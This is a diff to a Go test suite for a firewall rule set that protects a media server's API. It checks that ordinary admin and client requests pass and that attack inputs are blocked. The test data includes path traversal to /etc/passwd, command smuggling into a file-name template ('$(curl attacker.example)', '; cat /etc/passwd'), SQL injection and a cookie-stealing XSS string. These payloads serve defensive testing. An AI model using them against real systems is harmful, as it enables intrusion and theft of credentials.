@@ -63,6 +63,18 @@ var cvLogLines = []string{
 	"[sync] position beacon queued: {\"index\":1,\"positionMs\":31275}",
 }
 
+// cvTemplates are what a library's files are named by: Cavu's own layouts
+// and ones an admin writes.
+var cvTemplates = []string{
+	"{title}[ ({year})]/{title}[ ({year})][ {editiontag}][ - {version}][ - pt{part}]{ext}",
+	"{title}[ ({year})][ {idtag}]/{title}[ ({year})][ {idtag}][ {editiontag}][ - {version}][ - pt{part}]{ext}",
+	"{show}[ ({year})][ {idtag}]/{episodes}[ {title}][ - pt{part}]{ext}",
+	"{albumartist}/{album}[ ({year})]/[{discfolder}/]{track:02} - {title}{ext}",
+	"{albumartist}/[{year} - ]{album}/[{disc}-]{track:02} {title}{ext}",
+	"Films/{title} ({year})/{title}{ext}",
+	"{show}/Season {season:02}/{show} - S{season:02}E{episode:02}{ext}",
+}
+
 // cvProfiles are the codec profiles a browser says it plays.
 var cvProfiles = [][]string{{"constrained baseline", "main", "high"}, {"main", "main 10"}, {"high 10", "high"}, {"profile 0", "profile 2"}}
 
@@ -165,7 +177,15 @@ func (g cv) requests() []cvRequest {
 		cvBody("POST", api+"/admin/libraries", map[string]any{"name": g.pick("Films", "TV Shows", "Music"), "kind": "movies",
 			"paths": []string{g.pick(cvPaths...), g.pick(cvPaths...)}, "restricted": true, "userIds": []string{g.id()}}),
 		cvBody("PUT", api+"/admin/libraries/"+lib+"/access", map[string]any{"restricted": true, "userIds": []string{g.id(), g.id()}}),
-		cvBody("PUT", api+"/admin/libraries/"+lib+"/organize/settings", map[string]any{"enabled": true, "layout": "standard", "dryRun": false}),
+		cvBody("PUT", api+"/admin/libraries/"+lib+"/organize/settings", map[string]any{"enabled": true, "preset": "custom",
+			"template": cvTemplates[0], "maxFiles": 500, "opsPerSec": 20, "safeNames": true}),
+		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/layout/validate", map[string]any{"preset": "custom",
+			"template": cvTemplates[1], "safeNames": true}),
+		cvBody("PUT", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "continue", "hidden": false},
+			map[string]any{"key": "nextup", "hidden": true}, map[string]any{"key": "recent:" + lib, "hidden": false},
+			map[string]any{"key": "recent:" + item, "hidden": false}}}),
+		cvBody("PUT", api+"/admin/home", map[string]any{"rows": []any{map[string]any{"key": "recent:" + lib, "hidden": false},
+			map[string]any{"key": "continue", "hidden": false}}}),
 		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/plans", map[string]any{"source": "findings", "findings": []string{g.id()},
 			"tagEdits": []any{map[string]any{"file": g.id(), "disc": 1, "track": 3, "year": "1982", "discTotal": 2, "compilation": false}}}),
 		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/actions", map[string]any{"finding": g.id(), "files": []string{g.id()},
@@ -302,6 +322,18 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 				c["response"].(map[string]any)["signature"] = sig
 				send(cvBody("POST", "/api/v1/auth/step-up/passkey/finish", map[string]any{"credential": c}), " (a passkey)")
 			}
+			h := cv{td{vw{rand.New(rand.NewPCG(uint64(pl), 1100))}}}
+			for _, tpl := range cvTemplates {
+				lib := h.id()
+				send(cvBody("POST", "/api/v1/admin/libraries/"+lib+"/organize/layout/validate", map[string]any{"preset": "custom",
+					"template": tpl, "safeNames": false}), "")
+				send(cvBody("PUT", "/api/v1/admin/libraries/"+lib+"/organize/settings", map[string]any{"enabled": true,
+					"preset": "custom", "template": tpl, "maxFiles": 2000, "opsPerSec": 50, "safeNames": true}), "")
+			}
+			// A player's 404 reads as SQL to libinjection, whatever the stream.
+			send(cvBody("POST", "/api/v1/dev/client-log", map[string]any{"page": "/watch/" + h.id(), "entries": []any{
+				map[string]any{"t": 3.2, "level": "warn", "src": "hls", "msg": "404 while loading https://media.example.com/api/v1/stream/" +
+					h.token() + "/51.m4s"}}}), "")
 			if t.Failed() {
 				t.Logf("events:\n%s", events(out))
 			}
@@ -320,8 +352,9 @@ type cvAttack struct {
 // too: in an argument the client fills with ids, numbers and words, in a
 // beacon, in a codec's profiles, in a password or a key sent where none
 // goes, and in names and paths the set lets through only in their own
-// places. Text, the client's log too, keeps what CRS alone refuses at
-// paranoia 1.
+// places. Text, the client's log and a template for files' names too,
+// keeps what CRS alone refuses at paranoia 1, less the one check each of
+// those two skips.
 func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := cv{td{vw{rand.New(rand.NewPCG(7, 23))}}}
@@ -339,6 +372,9 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "<script>alert(document.cookie)</script>"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "x' UNION SELECT password FROM users--"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done; cat /etc/passwd"}}})},
+		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}/../../../etc/passwd"})},
+		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}{ext}; cat /etc/passwd"})},
+		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}$(curl attacker.example){ext}"})},
 	}
 	attacks := []cvAttack{
 		// Without a character only the rules that count them see. Where
@@ -376,6 +412,9 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("POST", api+"/music/connect/hello", map[string]any{"name": "x", "password": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/items/"+item+"/played", map[string]any{"key": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/auth/login", map[string]any{"username": "x' UNION SELECT password FROM users--", "password": "x"})},
+		// A home row's key is one of three.
+		{4, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "a);(b", "hidden": false}}})},
+		{1, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "x' UNION SELECT password FROM users--"}}})},
 		// A passkey's answer is base64url.
 		{1, cvBody("POST", api+"/auth/passkey/finish", map[string]any{"credential": map[string]any{"id": "x", "response": map[string]any{
 			"signature": "x' OR 1=1--"}}})},
